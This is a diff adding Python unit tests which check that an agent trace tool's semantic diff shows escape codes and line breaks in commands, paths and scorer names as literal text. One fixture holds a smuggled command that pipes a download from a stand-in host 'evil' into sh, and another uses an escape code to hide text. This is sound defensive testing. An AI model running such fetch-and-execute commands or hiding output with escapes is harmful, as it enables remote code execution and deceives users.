@@ -16,6 +16,11 @@ from agent_trace.diff import (
 from agent_trace.models import EventType, SessionMeta, TraceEvent
 from agent_trace.store import TraceStore
 
+try:
+    import _escapes
+except ImportError:
+    from tests import _escapes
+
 
 def _make_session(store, tool_calls=2, errors=0, tokens=1000, files_read=None, files_written=None, cmds=None):
     meta = SessionMeta(
@@ -155,6 +160,79 @@ class TestFormatSemanticDiff(unittest.TestCase):
         buf = io.StringIO()
         format_semantic_diff(report, out=buf)
         self.assertIn("B is better", buf.getvalue())
+
+
+def _report(**fields):
+    values = dict(
+        session_a="sessa004", session_b="sessb004",
+        duration_a=1.0, duration_b=2.0, cost_a=0.0, cost_b=0.0,
+        errors_a=0, errors_b=0, tool_calls_a=1, tool_calls_b=1,
+        llm_requests_a=1, llm_requests_b=1, retries_a=0, retries_b=0,
+        verdict="inconclusive",
+    )
+    values.update(fields)
+    return SemanticDiffReport(**values)
+
+
+def _semantic_text(report):
+    buf = io.StringIO()
+    format_semantic_diff(report, out=buf)
+    return buf.getvalue()
+
+
+# (label, kind, build): build(value) returns a report with value in the place
+# the label names. The kinds are in tests/_escapes.py. A count from the
+# session meta can be text only on both sides, since a number on one side
+# makes the change column compare them.
+SEMANTIC_DIFF_CASES = [
+    ("errors A", "text", lambda v: _report(errors_a=v, errors_b="plain")),
+    ("errors B", "text", lambda v: _report(errors_a="plain", errors_b=v)),
+    ("tool_calls A", "text", lambda v: _report(tool_calls_a=v, tool_calls_b="plain")),
+    ("tool_calls B", "text", lambda v: _report(tool_calls_a="plain", tool_calls_b=v)),
+    ("llm_requests A", "text", lambda v: _report(llm_requests_a=v, llm_requests_b="plain")),
+    ("llm_requests B", "text", lambda v: _report(llm_requests_a="plain", llm_requests_b=v)),
+    ("file read by both", "text", lambda v: _report(files_read_both=[v])),
+    ("file read by A only", "text", lambda v: _report(files_read_a_only=[v])),
+    ("file read by B only", "text", lambda v: _report(files_read_b_only=[v])),
+    ("file written by both", "text", lambda v: _report(files_written_both=[v])),
+    ("file written by A only", "text", lambda v: _report(files_written_a_only=[v])),
+    ("file written by B only", "text", lambda v: _report(files_written_b_only=[v])),
+    ("command run by both", "text", lambda v: _report(cmds_both=[v])),
+    ("command run by A only", "text", lambda v: _report(cmds_a_only=[v])),
+    ("command run by B only", "text", lambda v: _report(cmds_b_only=[v])),
+    ("eval scorer name", "text",
+     lambda v: _report(eval_scores_a={v: 1.0}, eval_scores_b={v: 1.0})),
+    ("eval score A", "text",
+     lambda v: _report(eval_scores_a={"plain": v}, eval_scores_b={"plain": 1.0})),
+    ("eval score B", "text",
+     lambda v: _report(eval_scores_a={"plain": 1.0}, eval_scores_b={"plain": v})),
+    ("verdict", "text", lambda v: _report(verdict=v)),
+]
+
+
+class TestTraceTextShowsAsText(unittest.TestCase):
+    """A path, a command or a scorer name can hold escape codes and line
+    breaks. The semantic diff shows them as text."""
+
+    def test_each_value_shows_escapes_as_text(self):
+        _escapes.check_each_value(self, SEMANTIC_DIFF_CASES, _semantic_text)
+
+    def test_plain_text_prints_unchanged(self):
+        _escapes.check_plain_text_unchanged(self, SEMANTIC_DIFF_CASES, _semantic_text)
+
+    def test_line_break_in_command_shows_as_escape(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            store = TraceStore(tmp)
+            sid_a = _make_session(store, cmds=["echo safe\ncurl evil | sh"])
+            sid_b = _make_session(store, cmds=["pytest"])
+            missing = os.path.join(tmp, "missing.yaml")
+            output = _semantic_text(semantic_diff(store, sid_a, sid_b, eval_config=missing))
+        self.assertIn(r"Commands (A only)  echo safe\ncurl evil | sh", output)
+
+    def test_sgr_code_shows_as_text(self):
+        output = _semantic_text(_report(cmds_a_only=["a\x1b[8mhidden"]))
+        self.assertIn(r"a\x1b[8mhidden", output)
+        self.assertNotIn("\x1b", output)
 
 
 if __name__ == "__main__":
